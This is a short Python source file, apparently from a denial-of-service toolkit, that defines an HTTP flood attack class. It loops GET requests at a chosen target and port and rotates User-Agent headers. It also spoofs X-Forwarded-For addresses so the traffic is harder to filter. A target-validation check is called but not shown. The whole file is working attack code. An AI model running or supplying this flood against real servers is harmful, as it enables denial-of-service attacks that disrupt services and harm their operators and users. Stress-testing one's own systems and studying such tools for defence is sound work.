import aiohttp
import asyncio
import random
from core.ethical_check import EthicalEnforcer
from core.network_utils import random_ip

class HTTPFlood:
    def __init__(self):
        self.eth = EthicalEnforcer()
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)'
        ]
        
    async def attack(self, config):
        self.eth.validate_target(config.target)
        requests_sent = 0
        
        async with aiohttp.ClientSession() as session:
            while True:
                if config.packets > 0 and requests_sent >= config.packets:
                    break
                    
                headers = {
                    'User-Agent': random.choice(self.user_agents),
                    'X-Forwarded-For': random_ip()
                }
                
                try:
                    async with session.get(
                        f"http://{config.target}:{config.port}",
                        headers=headers
                    ) as response:
                        await response.text()
                        requests_sent += 1
                        
                        if requests_sent % 100 == 0:
                            print(f"Sent {requests_sent} HTTP requests", end='\r')
                except:
                    await asyncio.sleep(1)
        
        print(f"\nHTTP flood completed. Total requests: {requests_sent}")